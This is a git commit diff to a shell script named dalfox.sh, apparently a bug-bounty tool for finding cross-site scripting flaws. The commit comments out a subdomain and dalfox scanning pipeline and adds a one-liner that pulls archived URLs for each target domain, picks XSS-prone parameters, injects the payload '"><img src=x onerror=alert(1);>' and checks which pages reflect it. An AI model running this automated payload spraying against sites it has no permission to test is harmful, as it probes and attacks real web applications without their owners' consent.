14ea3a16d1a0ed58c51df18bcf10e8d9ed9da527
Aravind Menon <53946198+amaravindmenon@users.noreply.github.com>
2022-03-20 13:44:36 +0530

    Update dalfox.sh

--- dalfox.sh
+++ dalfox.sh
@@ -12,14 +12,16 @@ echo "
 scan started for $i
 "
 
-mkdir bugs/$i
-subfinder -d $i | httpx >> bugs/$i/subdomains.txt
+echo $i | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v "Not" >> $i.txt
 
-echo "XSS Hunting using gf and dalfox and xsstrike"
-waybackurls $i > bugs/$i/temp_waybackxss.txt
-cat bugs/$i/temp_waybackxss.txt | gf xss | sed 's/=.*/=/' | egrep -iv ".(jpg|jpeg|gif|tif|tiff|ico|pdf|svg|png|css|woff|woff2)" > bugs/$i/temp2_waybackxss.txt
-sort bugs/$i/temp2_waybackxss.txt | uniq -i > bugs/$i/waybackxss.txt
-cat bugs/$i/waybackxss.txt | dalfox pipe -o bugs/$i/dalfoxoutput.txt
-echo "XSSATACK FINISH"
+#mkdir bugs/$i
+#subfinder -d $i | httpx >> bugs/$i/subdomains.txt
+
+#echo "XSS Hunting using gf and dalfox and xsstrike"
+#waybackurls $i > bugs/$i/temp_waybackxss.txt
+#cat bugs/$i/temp_waybackxss.txt | gf xss | sed 's/=.*/=/' | egrep -iv ".(jpg|jpeg|gif|tif|tiff|ico|pdf|svg|png|css|woff|woff2)" > bugs/$i/temp2_waybackxss.txt
+#sort bugs/$i/temp2_waybackxss.txt | uniq -i > bugs/$i/waybackxss.txt
+#cat bugs/$i/waybackxss.txt | dalfox pipe -o bugs/$i/dalfoxoutput.txt
+#echo "XSSATACK FINISH"
 
 done
